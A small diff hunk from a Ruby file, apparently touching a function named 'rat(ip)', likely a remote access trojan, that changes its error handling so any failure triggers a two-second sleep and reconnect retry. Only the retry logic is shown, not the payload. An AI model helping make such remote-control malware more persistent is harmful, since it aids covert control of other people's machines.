@@ -54,8 +54,8 @@ def rat(ip)
         file.close
       end
     end
-
-  rescue SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
+    # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
+  rescue
     sleep 2
     retry
   rescue Interrupt
